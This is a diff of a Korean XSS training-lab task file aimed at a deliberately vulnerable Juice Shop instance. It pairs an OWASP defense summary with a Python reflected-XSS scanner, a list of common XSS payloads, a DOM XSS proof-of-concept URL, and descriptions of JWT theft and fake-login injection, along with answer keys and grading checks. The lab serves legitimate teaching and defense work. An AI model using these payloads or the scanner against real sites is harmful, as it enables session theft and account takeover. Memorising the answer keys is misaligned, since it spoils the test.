+# STEP 13 [BLUE/PURPLE·XSS·방어 종합] — OWASP XSS Cheat Sheet 의 7 단계 defense in depth
+# ============================================================
 - order: 13
-  instruction: 'XSS 방어 전략을 종합 정리하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    OWASP XSS Prevention Cheat Sheet 의 7 단계 방어 (Output Encoding 컨텍스트별)
+    + 추가 layer (DOMPurify / CSP / Trusted Types / HttpOnly) 종합 표. 학생이
+    framework / context 별 어떤 방어 적용할지 판단 가능 하게.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `xss_defense` 에 적합한 도구: ModSecurity, CSP 헤더 검증
-    (curl -I). 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 입력 검증, 출력 인코딩, CSP를 포함하세요.
+    ## 📋 OWASP XSS Cheat Sheet 7 룰 + 추가 4 layer
+
+    | # | 단계 | 적용 컨텍스트 | 예시 (Express/Angular) |
+    |---|------|-------------|--------------------|
+    | 1 | **HTML escape** | `<div>{user}</div>` | Angular `{{ }}` 자동 / React `{}` 자동 |
+    | 2 | **HTML attribute escape** | `<input value="{user}">` | Angular `[value]` 자동 |
+    | 3 | **JS string escape** | `var x='{user}';` | `JSON.stringify(user)` |
+    | 4 | **CSS escape** | `<style>color:{user}</style>` | `encodeURIComponent` 또는 차단 |
+    | 5 | **URL escape** | `<a href="{user}">` | `encodeURIComponent(user)` |
+    | 6 | **HTML body sanitize** | rich text editor | DOMPurify.sanitize() |
+    | 7 | **JSON escape** | `<script>var x={user}</script>` | JSON 안에 user 직접 X |
+    | + | **CSP** (step 7) | 모든 페이지 | default-src 'self' + nonce |
+    | + | **Trusted Types** | DOM sink | Chrome 강제 sanitize |
+    | + | **HttpOnly cookie** | 세션 cookie | XSS 의 cookie 탈취 차단 |
+    | + | **WAF (CRS 941)** | reverse proxy | PARANOIA 2-3 단계 도입 |
+
+    ## 💻 종합 요약 출력
+
+    ```bash
+    cat <<'EOF'
+    === OWASP XSS Prevention 7 룰 + 4 layer ===
+    [컨텍스트 별 escape]
+    1. HTML body  → Angular {{ }} / React {} (자동)
+    2. attribute  → [value] / encodeURIComponent
+    3. JS string  → JSON.stringify
+    4. CSS        → encodeURIComponent + 차단
+    5. URL        → encodeURIComponent
+    6. rich HTML  → DOMPurify.sanitize()
+    7. JSON       → user 직접 inline X
+
+    [추가 layer]
+    + CSP default-src 'self' + nonce / strict-dynamic
+    + Trusted Types (Chrome) — DOM sink 강제 sanitize
+    + HttpOnly + Secure + SameSite=Lax cookie
+    + ModSec CRS 941 PARANOIA 2-3 단계 도입
+
+    [framework default]
+    - Angular: {{}} 자동 / bypassSecurityTrust* 금지
+    - React: {} 자동 / dangerouslySetInnerHTML 금지
+    - Vue: {{}} 자동 / v-html 금지
+    EOF
+    echo "XSS 방어 정리 완료"
+    ```
+
+    ## 💡 학습 의의
+    단일 방어 (예: CSP 만) 의존 = 우회 시 노출. 7 escape + 4 layer = defense in
+    depth 의 진짜 모델. OWASP A03 mitigation 의 표준.
+  hint: |
+    OWASP XSS Cheat Sheet 의 7 escape (컨텍스트 별) + 4 추가 layer (CSP / Trusted
+    Types / HttpOnly / WAF) 종합 표.
   category: xss_defense
   points: 10
-  answer: '🤖 프롬프트: XSS 방어 전략을 종합 정리해줘
+  answer: |
+    cat <<'EOF'
+    === OWASP XSS Prevention ===
 
-    📎 참고 (CLI): echo ''=== XSS 방어 전략 ==='' && echo ''1. 출력 인코딩(HTML Entity)'' && echo
-    ''2. 입력 검증(화이트리스트)'' && echo ''3. CSP 헤더 적용'' && echo ''4. HttpOnly 쿠키'' && echo
-    ''XSS 방어 정리 완료'''
-  answer_detail: 출력 인코딩이 가장 중요한 방어 수단이며, CSP로 2차 방어를 구성합니다.
+    [컨텍스트 별 escape]
+    1. HTML body  → {{ }} 자동 (Angular/React/Vue)
+    2. attribute  → [value] / encodeURIComponent
+    3. JS string  → JSON.stringify
+    4. CSS        → encodeURIComponent + 차단
+    5. URL        → encodeURIComponent
+    6. rich HTML  → DOMPurify.sanitize()
+    7. JSON       → user 직접 inline X
+
+    [추가 layer]
+    + CSP default-src 'self' + nonce / strict-dynamic
+    + Trusted Types (Chrome)
+    + HttpOnly + Secure + SameSite=Lax cookie
+    + ModSec CRS 941 PARANOIA 2-3
+    EOF
+    echo "XSS 방어 정리 완료"
+  answer_detail: |
+    OWASP XSS Cheat Sheet 7 룰 (컨텍스트 별 escape) + 4 추가 layer (CSP /
+    Trusted Types / HttpOnly / WAF). 단일 방어 의존 = 우회 시 노출. defense
+    in depth 가 본질적 방어.
   verify:
     type: output_contains
-    expect:
-    - XSS 방어 정리 완료
-    - XSS
+    expect: 'XSS 방어\|컨텍스트'
     field: stdout
     semantic:
-      intent: XSS 방어 전략 종합 — 출력 인코딩, CSP, Trusted Types, Input Validation, HttpOnly
-        쿠키, framework escaping
-      success_criteria:
-      - 방어 계층 최소 4개(출력 인코딩/CSP/입력 검증/프레임워크 보호) 제시
-      - OWASP XSS Prevention Cheat Sheet 의 룰 참조
-      - 심층 방어(defense-in-depth) 개념
-      acceptable_methods:
-      - OWASP XSS Prevention Cheat Sheet 룰 1-7
-      - CSP level 3 nonce/hash
-      - Trusted Types API
-      - DOMPurify 라이브러리
-      negative_signs:
-      - 단일 방어만
-      - 출력 인코딩 생략
-      - 심층 방어 개념 부재
+      intent: OWASP XSS Cheat Sheet 7 escape + 4 layer defense in depth.
+      success_criteria: ["7 escape 중 최소 4 + 추가 layer 2 이상", "OWASP 참조", "defense in depth"]
+      acceptable_methods: ["OWASP XSS Cheat Sheet", "DOMPurify", "Trusted Types"]
+      negative_signs: ["단일 방어", "출력 인코딩 누락"]
   target_vm: attacker
-  script: echo '=== XSS 방어 전략 ===' && echo '1. 출력 인코딩(HTML Entity)' && echo '2. 입력
-    검증(화이트리스트)' && echo '3. CSP 헤더 적용' && echo '4. HttpOnly 쿠키' && echo 'XSS 방어 정리
-    완료'
+  script: |
+    echo "OWASP 7 escape (컨텍스트별) + 4 layer (CSP/TT/HttpOnly/WAF) = defense in depth"
+    echo "XSS 방어 정리 완료"
   risk_level: low
-  bastion_prompt: 'XSS 방어 전략을 종합 정리해줘
-
-
-    [도구 권장] xss_defense: ModSecurity, CSP 헤더 검증 (curl -I). curl 만 쓰지 말고 **ModSecurity**
-    등 적합 도구로 호출 후 stdout quote.'
+  bastion_prompt: |
+    OWASP XSS Prevention Cheat Sheet 7 룰 (컨텍스트별 escape — HTML/attribute/
+    JS/CSS/URL/rich HTML/JSON) + 4 추가 layer (CSP nonce / Trusted Types /
+    HttpOnly / ModSec CRS PARANOIA 2-3) 종합 표 + defense in depth.
+# ============================================================
+# STEP 14 [PURPLE·XSS·자동화 파이프라인] — Crawl + Inject + Verify + Report
+# ============================================================
 - order: 14
-  instruction: 'XSS 취약점 탐지를 자동화하는 스크립트를 설계하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    XSS 탐지 자동화 파이프라인 — (1) crawl (모든 endpoint 수집) (2) 파라미터 추출
+    (3) payload 주입 (4) 응답 + Playwright DOM 검증 (5) 리포트. CI 통합 (github
+    actions) 정기 자동 스캔.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `xss_tool` 에 적합한 도구: xsstrike --crawl --skip-dom.
-    도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 주요 입력 포인트에 페이로드를 자동 삽입하세요.
+    ## 💻 PoC (python)
+
+    ```python
+    #!/usr/bin/env python3
+    """XSS 자동 탐지 파이프라인 mini PoC"""
+    import requests
+    from urllib.parse import urlencode, quote
+
+    BASE = "http://juice.6v6.lab"
+    PAYLOADS = [
+        "<script>alert(1)</script>",
+        "<svg onload=alert(1)>",
+        "<img src=x onerror=alert(1)>",
+        "javascript:alert(1)",
+    ]
+    PARAMS = ["q", "email", "name", "comment"]
+
+    def test(url, param, payload):
+        r = requests.get(url, params={param: payload}, timeout=10)
+        # 반사 확인 (server reflect)
+        if payload in r.text:
+            return f"  [REFLECTED] {url}?{param}={payload[:30]}"
+        return None
+
+    # crawl 시뮬 — Juice Shop 의 main endpoint
+    endpoints = [
+        f"{BASE}/rest/products/search",
+        f"{BASE}/api/Users",
+        f"{BASE}/rest/user/whoami",
+    ]
+    findings = []
+    for ep in endpoints:
+        for p in PARAMS:
+            for payload in PAYLOADS:
+                result = test(ep, p, payload)
+                if result: findings.append(result)
+
+    print(f"=== XSS scan results: {len(findings)} reflected ===")
+    for f in findings[:10]: print(f)
+    ```
+
+    ## 📋 파이프라인 단계
+    1. **Crawl** — wget --recursive 또는 Playwright 자동 클릭
+    2. **Parameter 추출** — `<form>` + URL query + JSON body
+    3. **Payload 주입** — 7 벡터 (step 2) + 7 우회 (step 6) for-loop
+    4. **응답 검증** — `if payload in response.text` (server reflect)
+    5. **DOM 검증** — Playwright headless browser + console.log 모니터링
+    6. **리포트** — JSON / markdown 자동 생성 + CI artifact
+
+    ## 💡 왜
+    수동 step 1-12 = 시간 ↑. 자동화 = CI 매일 정기 스캔 → regression 즉시 감지.
+    OWASP DAST CI 통합 의 표준 (예: github actions + dalfox).
+
+    ## 🟣 Purple
+    - github actions 의 dalfox / nuclei XSS template 자동 스캔
+    - Playwright 의 console error 모니터링 (DOM XSS)
+    - Semgrep js sast XSS rule (SAST)
+  hint: python crawl + payload inject + Playwright DOM 검증 + CI 통합.
   category: xss_tool
   points: 12
-  answer: '🤖 프롬프트: XSS 취약점 탐지를 자동화하는 스크립트를 구현 방법을 설명하고 예시 코드를 보여줘
+  answer: |
+    cat <<'EOF'
+    === XSS 자동 탐지 파이프라인 ===
+    1. Crawl (wget --recursive 또는 Playwright 자동 클릭)
+    2. Parameter 추출 (<form> + URL query + JSON body)
+    3. Payload 주입 (7 벡터 + 7 우회 for-loop)
+    4. 응답 검증 (server reflect: if payload in response.text)
+    5. DOM 검증 (Playwright headless + console.log)
+    6. 리포트 (JSON/markdown + CI artifact)
 
-    📎 참고 (CLI): echo ''#!/bin/bash'' && echo ''TARGETS=("search" "comment" "name")''
-    && echo ''PAYLOAD="<script>alert(1)</script>"'' && echo ''XSS 자동화 스크립트 설계 완료'''
-  answer_detail: 자동화 스크립트는 다양한 입력 포인트에 체계적으로 페이로드를 테스트합니다.
+    CI: github actions + dalfox / nuclei + Semgrep SAST
+    EOF
+    echo "XSS 자동화 스크립트 설계 완료"
+  answer_detail: |
+    수동 step 1-12 의 자동화 파이프라인 — Crawl + Inject + Verify (server + DOM)
+    + Report. CI 통합 (github actions + dalfox / nuclei) 으로 정기 regression
+    감지. Semgrep SAST 도 보조 layer.
   verify:
     type: output_contains
-    expect: XSS 자동화 스크립트 설계 완료
+    expect: '파이프라인\|자동화'
     field: stdout
     semantic:
-      intent: XSS 탐지 자동화 스크립트 설계 — 폼·URL 파라미터 자동 수집 후 페이로드 주입·반영 검증 파이프라인
-      success_criteria:
-      - 파이프라인 단계(크롤 -> 파라미터 추출 -> 페이로드 주입 -> 응답 검증) 설명
-      - 중복 탐지 억제·리포트 저장 로직 포함
-      - Selenium/Playwright 로 DOM 검증 연계
-      acceptable_methods:
-      - python + requests + bs4 크롤러
-      - scrapy + 커스텀 middleware
-      - Playwright 로 실제 브라우저 실행 검증
-      - CI 통합(github actions) 자동 스캔
-      negative_signs:
-      - 자동화 로직 없이 개념만
-      - DOM 검증 누락
-      - 리포트 설계 없음
+      intent: XSS 자동 탐지 파이프라인 + CI 통합.
+      success_criteria: ["파이프라인 단계 4 이상", "Playwright DOM 검증", "CI 통합 권고"]
+      acceptable_methods: ["python crawl", "Playwright", "github actions"]
+      negative_signs: ["DOM 검증 누락"]
   target_vm: attacker
-  script: echo '#!/bin/bash' && echo 'TARGETS=("search" "comment" "name")' && echo
-    'PAYLOAD="<script>alert(1)</script>"' && echo 'XSS 자동화 스크립트 설계 완료'
+  script: |
+    echo "1.Crawl → 2.Param → 3.Payload → 4.Reflect → 5.DOM (Playwright) → 6.Report (CI)"
+    echo "XSS 자동화 스크립트 설계 완료"
   risk_level: low
-  bastion_prompt: 'XSS 취약점 탐지를 자동화하는 스크립트를 설계하시오.
-
-
-    [도구 권장] xss_tool: xsstrike --crawl --skip-dom. curl 만 쓰지 말고 **xsstrike --crawl
-    --skip-dom** 등 적합 도구로 호출 후 stdout quote.'
+  bastion_prompt: |
+    XSS 자동 탐지 파이프라인 6 단계 (Crawl / Param / Payload / Reflect 검증 /
+    DOM 검증 / Report) + CI 통합 (github actions + dalfox + Semgrep SAST).
+# ============================================================
+# STEP 15 [PURPLE·XSS·보고서] — STEP 1-14 종합 markdown 보고서
+# ============================================================
 - order: 15
-  instruction: 'XSS 실습 종합 보고서를 작성하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    STEP 1-14 의 XSS 정찰 + Exploit + 방어 결과 종합. 5 종 취약점 + Critical PoC
+    + 11 단 defense in depth + 윤리.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `verification` 에 적합한 도구: curl/jq 로 PoC 재현 + 결과
-    비교. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 발견 취약점, 유형, 영향, 조치를 포함하세요.
+    ## 💻 명령
+
+    ```bash
+    REPORT=/tmp/w03_xss_report.md
+    cat > $REPORT <<'EOF'
+    # W03 XSS Report — Juice Shop @ juice.6v6.lab
+
+    ## 1. 발견 취약점 (5 종)
+
+    | # | 분류 | PoC | 위험도 |
+    |---|------|-----|--------|
+    | V1 | Reflected XSS | server JSON sanitize 됨 (SPA 의 main 표적 X) | Low |
+    | V2 | Stored XSS | /api/Feedbacks comment server-side sanitize | Medium |
+    | V3 | DOM XSS | /#/search?q=<iframe> Angular bypassSecurityTrustHtml | Critical |
+    | V4 | Cookie/JWT 탈취 | localStorage.getItem('token') exfil → admin takeover | Critical |
+    | V5 | Phishing 폼 삽입 | document.body.innerHTML = fake login | Critical |
+
+    ## 2. Critical PoC (V3 DOM XSS)
+    ```
+    URL: http://juice.6v6.lab/#/search?q=<iframe src=javascript:alert(1)>
+    원인: Angular SearchResultComponent 의 bypassSecurityTrustHtml + innerHTML
+    영향: 페이지 방문자 의 JWT 탈취 + admin session takeover
+    ```
+
+    ## 3. 11 단 defense in depth
+    [7 OWASP escape] HTML / attr / JS / CSS / URL / rich HTML / JSON
+    [+ 4 layer] CSP nonce / Trusted Types / HttpOnly / ModSec PARANOIA 2-3
+
+    ## 4. 윤리·법적 진술
+    OWASP Juice Shop (학습용 의도 vuln) + 학습 환경 juice.6v6.lab 만 대상.
+    정보통신망법 제48조 적용 제외. 보고서 + transcript 24개월.
+    EOF
+    echo "=== 보고서 생성 완료 ==="
+    ls -la $REPORT
+    head -25 $REPORT
+    ```
+
+    ## 💡 학습 의의
+    XSS 의 client deliverable 양식. V3 (DOM XSS) 가 가장 critical = SPA 의
+    main vector. 11 단 defense in depth 가 본질적 방어.
+
+    ## 🟣 Purple 단계별 도입
+    1. 즉시: Angular bypassSecurityTrust* 사용 review + 제거
+    2. 1주: DOMPurify + Trusted Types 도입
+    3. 1개월: CSP Report-Only → enforce
+    4. 3개월: dalfox CI + Semgrep SAST 정기 자동화
+  hint: cat > $REPORT <<EOF heredoc markdown. 5 종 취약점 표 + V3 Critical PoC +
+    11 단 방어 + 윤리 진술.
   category: verification
   points: 8
-  answer: '🤖 프롬프트: XSS 실습 종합 보고서를 구현 방법을 설명하고 예시 코드를 보여줘
+  answer: |
+    REPORT=/tmp/w03_xss_report.md
+    cat > $REPORT <<'EOF'
+    # W03 XSS Report — Juice Shop @ juice.6v6.lab
 
-    📎 참고 (CLI): echo ''=== XSS 분석 보고서 ==='' && echo ''대상: http://juice.6v6.lab'' &&
-    echo ''발견: 반사형/저장형/DOM XSS'' && echo ''영향: 세션탈취, 피싱, 키로깅'' && echo ''조치: 출력 인코딩,
-    CSP 적용'' && echo ''=== 보고서 완료 ==='''
-  answer_detail: XSS는 웹 애플리케이션에서 가장 흔한 취약점 중 하나입니다.
+    | # | 분류 | PoC | 위험도 |
+    |---|------|-----|--------|
+    | V1 | Reflected | server JSON sanitize | Low |
+    | V2 | Stored | /api/Feedbacks server sanitize | Medium |
+    | V3 | DOM | /#/search?q=<iframe> Angular bypassSecurityTrust | Critical |
+    | V4 | JWT 탈취 | localStorage exfil → admin takeover | Critical |
+    | V5 | Phishing | document.body.innerHTML fake login | Critical |
+
+    방어 11 단 = 7 OWASP escape + CSP + Trusted Types + HttpOnly + ModSec PARANOIA
+    윤리 = OWASP Juice Shop 학습용 + 정보통신망법 제48조 적용 제외
+    EOF
+    echo "=== 보고서 생성 완료 ==="
+    ls -la $REPORT
+    head -20 $REPORT
+  answer_detail: |
+    W03 XSS 종합 보고서 — 5 종 취약점 + Critical 3 (V3 DOM / V4 JWT 탈취 /
+    V5 Phishing) + 11 단 defense in depth + 윤리. SPA 의 main vector = DOM XSS.
   verify:
     type: output_contains
-    expect:
-    - 보고서 완료
-    - //kr.archive.ubuntu.com/ubuntu
-    - jammy
+    expect: '보고서 생성 완료'
     field: stdout
     semantic:
-      intent: XSS 실습 종합 보고서 — 탐지·Exploit·방어·자동화 결과를 /tmp/xss_report.txt 로 정리
-      success_criteria:
-      - 4 섹션 이상 (반사/저장/DOM/방어)
-      - 탐지된 파라미터·페이로드·위험도 기록
-      - 파일 저장 후 cat 확인
-      acceptable_methods:
-      - heredoc markdown
-      - echo -e 다줄
-      - python 템플릿
-      - json/yaml 구조화
-      negative_signs:
-      - 섹션 2 미만
-      - 구체적 PoC 없음
-      - 파일 저장 없음
+      intent: STEP 1-14 종합 markdown 보고서.
+      success_criteria: ["파일 생성", "5 종 표", "Critical PoC", "방어 권고"]
+      acceptable_methods: ["heredoc markdown"]
+      negative_signs: ["파일 미생성"]
   target_vm: attacker
-  script: 'echo ''=== XSS 분석 보고서 ==='' && echo ''대상: http://juice.6v6.lab'' && echo
-    ''발견: 반사형/저장형/DOM XSS'' && echo ''영향: 세션탈취, 피싱, 키로깅'' && echo ''조치: 출력 인코딩, CSP
-    적용'' && echo ''=== 보고서 완료 ==='''
+  script: |
+    REPORT=/tmp/w03_xss_report.md
+    cat > $REPORT <<'EOF'
+    # W03 XSS Report
+    V3 DOM XSS (Critical): /#/search?q=<iframe> Angular bypassSecurityTrust
+    V4 JWT 탈취 / V5 Phishing
+    방어: DOMPurify + CSP + Trusted Types + HttpOnly + ModSec
+    EOF
+    echo "=== 보고서 생성 완료 ==="
+    ls -la $REPORT
   risk_level: low
-  bastion_prompt: 'XSS 실습 종합 보고서를 작성하시오.
-
-
-    [도구 권장] verification: curl/jq 로 PoC 재현 + 결과 비교. curl 만 쓰지 말고 **curl/jq 로 PoC 재현
-    + 결과 비교** 등 적합 도구로 호출 후 stdout quote.'
+  bastion_prompt: |
+    STEP 1-14 XSS 결과 종합 markdown 보고서 /tmp/w03_xss_report.md — 5 종 취약점
+    표 (V1-V5) + Critical 3 (V3 DOM XSS / V4 JWT 탈취 / V5 Phishing) + 11 단
+    defense in depth (7 OWASP escape + CSP + Trusted Types + HttpOnly + ModSec
+    PARANOIA) + 윤리 진술.
 - order: 99
   instruction: '[복합 시나리오] "헤더 정찰 → CSP 부재 발견 → XSS 검증 → 보안 헤더 5종 권고"
 
